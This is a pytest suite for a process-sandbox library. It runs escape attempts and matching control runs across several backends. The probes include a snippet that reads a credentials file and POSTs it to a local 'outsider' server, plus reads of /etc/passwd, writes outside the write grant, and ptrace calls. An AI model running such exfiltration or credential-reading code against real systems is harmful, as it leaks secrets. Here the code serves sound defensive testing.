"""The guarantee table, executed: one escape + one control per backend x token.

``SandboxResult.enforced`` is a claim. This file is what makes it a tested
contract instead of a wish: for every token a backend reports, the attack that
token exists to stop is run for real and asserted stopped, and a control that
relaxes only that confinement runs the identical attack and asserts it then
succeeds. The control is the load-bearing half — a block that comes from the
kernel refusing the syscall proves nothing, so each escape must be shown to be
the sandbox's doing by turning the sandbox off and watching the attack land.

The rows are driven off the token contract documented in
``interlock/brace/__init__.py``: every escape test first asserts the token is
actually claimed for its profile, so a backend that quietly stops reporting a
token it delivers fails here rather than vanishing from the matrix. Backends
missing on the host (bwrap on macOS, sandbox-exec on Linux) skip per row with
a reason, visible under ``pytest -rs`` — never silently.
"""
from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
import textwrap

import pytest

from interlock.brace import (
    Sandbox,
    SandboxProfile,
    available_backends,
    compile_profile,
    select_backend,
)
from interlock.brace.backends.landlock import landlock_abi, syscall_filter


def _landlock_tokens():
    """Landlock's row, which depends on the kernel rather than the binary.

    ``net`` is only handleable from ABI 4 (Linux 6.7+), and ``syscalls`` only
    where the kernel exposes a seccomp denylist for this machine; below those
    the backend honestly reports nothing and this table must expect that, not
    the newest row, or the drift test would fail on an older host.
    """
    tokens = ["env", "fs-ro", "fs-rw", "rlimit"]
    if (landlock_abi() or 0) >= 4:
        tokens.append("net")
    if syscall_filter() is not None:
        tokens.append("syscalls")
    return tuple(tokens)


# The contract: the tokens each backend is allowed to claim, keyed by backend
# name. The drift test at the bottom pins the union of what a backend reports
# over a battery of profiles to exactly these sets, in both directions.
TOKENS_BY_BACKEND = {
    "soft": ("env", "rlimit"),
    "bubblewrap": ("env", "fs-ro", "fs-rw", "pid", "net", "rlimit"),
    "landlock": _landlock_tokens(),
    "sandbox-exec": ("env", "fs-rw", "net", "rlimit"),
}

_AVAILABLE = set(available_backends())


def _needs_landlock_net(backend):
    """Skip a net row for landlock on a kernel whose ABI has no net rules."""
    if backend == "landlock" and (landlock_abi() or 0) < 4:
        pytest.skip("landlock handles TCP only at ABI 4+ (Linux 6.7+)")


def _backends(*names):
    """Parametrize helper: each named backend, skipping with a reason if absent."""
    return [
        pytest.param(name, marks=pytest.mark.skipif(
            name not in _AVAILABLE,
            reason="%s is not available on this host (available: %s)"
            % (name, ", ".join(sorted(_AVAILABLE)) or "none"),
        ))
        for name in names
    ]


def _run(backend, profile, argv, timeout=20):
    return Sandbox(profile, backend=backend).run(argv, timeout=timeout)


def _exfil_code(secret_path, url):
    """Read a secret and POST it to the outsider: the exfil attempt itself."""
    return textwrap.dedent(
        """
        import urllib.request
        body = open({path!r}, "rb").read()
        req = urllib.request.Request({url!r}, data=body, method="POST")
        urllib.request.urlopen(req, timeout=3)
        print("SENT")
        """
    ).format(path=secret_path, url=url)


@pytest.fixture
def protected_dir():
    """A directory outside every default write grant, under $HOME.

    The macOS backend grants only the device nodes a process needs plus the
    run's own private scratch directory, so a sibling under the shared temp
    root would also be denied; $HOME keeps the fixture meaningful on every
    backend and makes the grant the only thing that can allow the write.
    """
    d = os.path.join(os.path.expanduser("~"), ".interlock_brace_matrix_%d" % os.getpid())
    os.makedirs(d, exist_ok=True)
    try:
        yield d
    finally:
        shutil.rmtree(d, ignore_errors=True)


# --- env: a secret in the parent's environment must not cross into the child --

_SENTINEL_KEY = "BRACE_MATRIX_SENTINEL"
_SENTINEL_VALUE = "sk-MATRIX-SENTINEL-DO-NOT-SHIP"

_ENV_PROBE = textwrap.dedent(
    """
    import os
    print("LEAKED" if os.environ.get({key!r}) == {value!r} else "SCRUBBED")
    """
).format(key=_SENTINEL_KEY, value=_SENTINEL_VALUE)


@pytest.mark.parametrize("backend", _backends("soft", "bubblewrap", "landlock", "sandbox-exec"))
def test_env_escape_parent_secret_never_reaches_child(backend, monkeypatch):
    """The parent process holds a sentinel secret in its environment; the
    sandboxed child reaches for it and must come up empty-handed."""
    monkeypatch.setenv(_SENTINEL_KEY, _SENTINEL_VALUE)
    result = _run(backend, compile_profile({}), ["python3", "-c", _ENV_PROBE])
    assert "env" in result.enforced
    assert result.returncode == 0
    assert result.stdout.strip() == "SCRUBBED", "a parent env secret crossed into the sandbox"


@pytest.mark.parametrize("backend", _backends("soft", "bubblewrap", "landlock", "sandbox-exec"))
def test_env_control_granted_secret_reaches_child(backend):
    """Control: the identical probe with the sentinel granted via the profile.
    The child sees it, which proves the SCRUBBED outcome above was the profile
    doing the scrubbing, not a broken probe."""
    profile = SandboxProfile(env={_SENTINEL_KEY: _SENTINEL_VALUE})
    result = _run(backend, profile, ["python3", "-c", _ENV_PROBE])
    assert "env" in result.enforced
    assert result.returncode == 0
    assert result.stdout.strip() == "LEAKED", "a granted env var was withheld"


# --- fs-rw: a write outside the grant must fail and change nothing ------------


def _tamper_command(protected):
    return ["/bin/sh", "-c", "echo TAMPERED > %s" % protected]


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock", "sandbox-exec"))
def test_fs_rw_escape_write_outside_grant_fails(backend, protected_dir):
    """The agent overwrites a config file outside its write grant. The write is
    denied and the file's bytes are untouched."""
    protected = os.path.join(protected_dir, "system.conf")
    with open(protected, "w") as f:
        f.write("TRUSTED=original")

    result = _run(backend, compile_profile({}), _tamper_command(protected))

    assert "fs-rw" in result.enforced
    assert result.returncode != 0, "an out-of-grant write was allowed"
    with open(protected) as f:
        assert f.read() == "TRUSTED=original", "an out-of-grant write tampered with the file"


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock", "sandbox-exec"))
def test_fs_rw_control_write_inside_grant_succeeds(backend, protected_dir):
    """Control: the same write to the same path, with the directory granted.
    It lands, which proves the denial above came from the grant, not from the
    shell redirection being broken on this host."""
    protected = os.path.join(protected_dir, "system.conf")
    with open(protected, "w") as f:
        f.write("TRUSTED=original")

    profile = SandboxProfile.locked().with_paths(write=[protected_dir])
    result = _run(backend, profile, _tamper_command(protected))

    assert result.returncode == 0
    with open(protected) as f:
        assert f.read().strip() == "TAMPERED"


# --- net: a secret in hand inside the sandbox must not be able to leave -------


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock", "sandbox-exec"))
def test_net_escape_exfiltration_to_outsider_fails(backend, outsider, credentials_file):
    """The agent holds a real credentials file and POSTs it to the outsider.
    The send is denied at the socket and the outsider receives nothing."""
    _needs_landlock_net(backend)
    # The secret is granted read-only so the attack genuinely has it in hand:
    # otherwise a filesystem backend could "stop" the exfil by hiding the file.
    profile = compile_profile({}).with_paths(read=[credentials_file])
    code = _exfil_code(credentials_file, outsider.url)

    result = _run(backend, profile, ["python3", "-c", code])

    assert "net" in result.enforced
    assert result.returncode != 0, "the exfil subprocess was not stopped"
    assert outsider.received == [], "a secret escaped the sandbox"


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock", "sandbox-exec"))
def test_net_control_egress_grant_lets_the_send_through(backend, outsider, credentials_file):
    """Control: the identical attack with an egress binding in the profile.
    The send succeeds and the outsider records the credentials, which proves
    the block above was policy, not broken networking."""
    _needs_landlock_net(backend)
    profile = compile_profile({"egress_allowlist": {"allowed_hosts": ["127.0.0.1"]}})
    profile = profile.with_paths(read=[credentials_file])
    code = _exfil_code(credentials_file, outsider.url)

    result = _run(backend, profile, ["python3", "-c", code])

    assert "net" not in result.enforced  # network is open, no isolation claimed
    assert result.returncode == 0
    assert any("OPENAI_API_KEY" in blob for blob in outsider.received)


# --- fs-ro: a read outside the grant must be denied (bubblewrap, landlock) ----

_FS_RO_PROBE = textwrap.dedent(
    """
    import sys
    try:
        open("/etc/passwd").read()
        print("READ")
    except OSError as exc:
        print("DENIED:%s" % type(exc).__name__)
        sys.exit(1)
    """
)


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock"))
def test_fs_ro_escape_read_outside_grant_fails(backend):
    """The agent reads a system file the profile never granted. Inside the
    bwrap mount namespace the path simply does not exist; under landlock the
    kernel refuses the open. Either way the read fails."""
    result = _run(backend, compile_profile({}), ["python3", "-c", _FS_RO_PROBE])

    assert "fs-ro" in result.enforced
    assert result.returncode != 0, "an out-of-grant read was allowed"
    assert result.stdout.strip().startswith("DENIED")


@pytest.mark.parametrize("backend", _backends("bubblewrap", "landlock"))
def test_fs_ro_control_granted_read_succeeds(backend):
    """Control: the same read with /etc/passwd granted read. It succeeds,
    which proves the denial above was the sandbox, not the file being
    unreadable on this host."""
    profile = SandboxProfile.locked().with_paths(read=["/etc/passwd"])
    result = _run(backend, profile, ["python3", "-c", _FS_RO_PROBE])

    assert result.returncode == 0
    assert result.stdout.strip() == "READ"


# --- pid: a host process must be invisible and unsignalable (bubblewrap only) --


def _pid_probe(host_pid):
    return textwrap.dedent(
        """
        import os, sys
        try:
            os.kill({pid}, 0)
            print("SIGNALED")
        except OSError:
            print("INVISIBLE")
            sys.exit(1)
        """
    ).format(pid=host_pid)


@pytest.mark.parametrize("backend", _backends("bubblewrap"))
def test_pid_escape_host_process_is_invisible(backend):
    """The agent signals the (real) pid of the test process running it. Under
    --unshare-pid that pid does not exist in the child's namespace, so the
    signal cannot even be addressed."""
    result = _run(backend, compile_profile({}), ["python3", "-c", _pid_probe(os.getpid())])

    assert "pid" in result.enforced
    assert result.returncode != 0, "the sandboxed child could address a host process"
    assert result.stdout.strip() == "INVISIBLE"


@pytest.mark.parametrize("backend", _backends("bubblewrap"))
def test_pid_control_shared_pid_namespace_can_signal(backend):
    """Control: the identical probe with unshare_pid off. The host pid is
    addressable, which proves the invisibility above was the PID namespace,
    not a permission quirk of kill(2)."""
    profile = SandboxProfile(unshare_pid=False)
    result = _run(backend, profile, ["python3", "-c", _pid_probe(os.getpid())])

    assert "pid" not in result.enforced  # no pid namespace, honestly not claimed
    assert result.returncode == 0
    assert result.stdout.strip() == "SIGNALED"


# --- rlimit: a runaway CPU burn must die (soft backend, portable) -------------


@pytest.mark.parametrize("backend", _backends("soft", "bubblewrap", "landlock", "sandbox-exec"))
def test_rlimit_escape_runaway_cpu_is_killed(backend):
    """A runaway agent burns CPU forever. RLIMIT_CPU kills it with SIGXCPU —
    asserted by signal number, not just "nonzero", because that is the exact
    death the token promises. The hook is set on the wrapper (bwrap or
    sandbox-exec) and inherited across exec, so this must hold on every
    backend, not only the soft one."""
    profile = SandboxProfile(cpu_seconds=1)
    result = _run(backend, profile, ["python3", "-c", "while True: pass"])

    assert "rlimit" in result.enforced
    assert result.returncode == -signal.SIGXCPU, (
        "expected death by SIGXCPU, got returncode %r" % result.returncode
    )


@pytest.mark.parametrize("backend", _backends("soft", "bubblewrap", "landlock", "sandbox-exec"))
def test_rlimit_control_no_ceiling_means_no_kill(backend):
    """Control: the identical infinite loop under a profile with no ceiling.
    Nothing inside the sandbox kills it, so the harness timeout is the only
    thing that ends it — proving the SIGXCPU above came from the rlimit."""
    with pytest.raises(subprocess.TimeoutExpired):
        _run(backend, compile_profile({}), ["python3", "-c", "while True: pass"], timeout=3)


# --- syscalls: a privileged call must come back EPERM (landlock only) ---------

# PTRACE_TRACEME succeeds for any unprivileged process, so the control is a
# real answer rather than a capability check wearing a sandbox result.
_PTRACE_PROBE = textwrap.dedent(
    """
    import ctypes
    lib = ctypes.CDLL(None, use_errno=True)
    rc = lib.ptrace(0, 0, 0, 0)
    print("%d %d" % (rc, ctypes.get_errno()))
    """
)


def _interpreter_profile():
    """This interpreter's prefix, read-only: enough to start python."""
    return SandboxProfile().with_paths(read=[sys.prefix])


def _needs_seccomp(backend):
    """Skip the syscall row where the backend cannot claim the token."""
    if backend == "landlock" and syscall_filter() is None:
        pytest.skip("landlock claims the syscall denylist only where the kernel "
                    "exposes one")


@pytest.mark.parametrize("backend", _backends("landlock"))
def test_syscalls_escape_privileged_call_fails(backend):
    """The agent calls ptrace(2) - the call that would let it read or steer
    another process. The filter answers EPERM and the call does nothing."""
    _needs_seccomp(backend)
    result = _run(backend, _interpreter_profile(),
                  [sys.executable, "-I", "-c", _PTRACE_PROBE])

    assert "syscalls" in result.enforced
    assert result.stdout.strip() == "-1 1", result.stderr  # rc -1, errno EPERM


@pytest.mark.parametrize("backend", _backends("soft"))
def test_syscalls_control_same_call_lands_without_the_filter(backend):
    """Control: the identical probe on a backend that claims no syscall layer.
    It succeeds, which proves the EPERM above was the filter."""
    result = _run(backend, _interpreter_profile(),
                  [sys.executable, "-I", "-c", _PTRACE_PROBE])

    assert "syscalls" not in result.enforced
    assert result.stdout.strip() == "0 0", result.stderr


# --- the contract itself: reported tokens must equal the table ----------------

# Profiles that between them exercise every claim each backend can make.
_BATTERY = (
    SandboxProfile.locked(),
    SandboxProfile(cpu_seconds=1, memory_mb=128),
    SandboxProfile(allow_network=True, allowed_hosts=("api.internal",)),
    SandboxProfile(unshare_pid=False),
)


@pytest.mark.parametrize("backend", _backends("soft", "bubblewrap", "landlock", "sandbox-exec"))
def test_reported_tokens_match_the_guarantee_table(backend):
    """Drift guard, both directions: the union of tokens a backend reports over
    a battery of profiles is exactly the set the guarantee table documents. A
    backend that starts claiming a token it does not deliver (or stops
    claiming one it does) fails here, and the table in interlock/brace/__init__.py
    must move in lockstep with it — the docstring is a tested contract."""
    backend_instance = select_backend(backend)
    reported = set()
    for profile in _BATTERY:
        reported.update(backend_instance.wrap(profile, ["/bin/echo", "probe"]).enforced)
    assert reported == set(TOKENS_BY_BACKEND[backend]), (
        "%s reports %s but the guarantee table says %s"
        % (backend, sorted(reported), sorted(TOKENS_BY_BACKEND[backend]))
    )
